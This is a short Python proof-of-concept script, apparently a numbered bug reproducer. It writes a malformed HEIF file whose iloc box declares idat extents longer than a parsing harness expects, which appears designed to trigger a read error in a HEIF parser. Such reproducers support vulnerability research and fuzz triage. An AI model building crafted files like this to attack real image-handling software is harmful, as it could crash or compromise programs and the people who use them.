#!/usr/bin/env python3
"""bug10: iloc with construction_method=1 + extent.length larger than the
size the harness will request from Box_iloc::read_data."""

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "common"))
import heif_box as hb


def main(out_path: str) -> None:
    idat_payload = b"A" * 0x1000

    bogus_iloc = hb.iloc(
        version=1,
        offset_size=4, length_size=4,
        base_offset_size=0, index_size=0,
        items=[{
            "item_id": 1, "construction_method": 1,    # idat
            "data_reference_index": 0,
            "extents": [(0, 0, 0x1000)],               # length = 0x1000
        }, {
            "item_id": 2, "construction_method": 1,    # idat
            "data_reference_index": 0,
            "extents": [(0, 0, 0x10)],
        }])

    payload = (hb.hdlr(b"pict") +
               hb.pitm(1) +
               hb.empty_iprp() +
               hb.iinf([(1, b"hvc1"), (2, b"hvc1")]) +
               bogus_iloc +
               hb.idat(idat_payload))

    out = hb.ftyp() + hb.fullbox(b"meta", 0, 0, payload)
    hb.write_file(out_path, out)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "bug10_poc.heif")
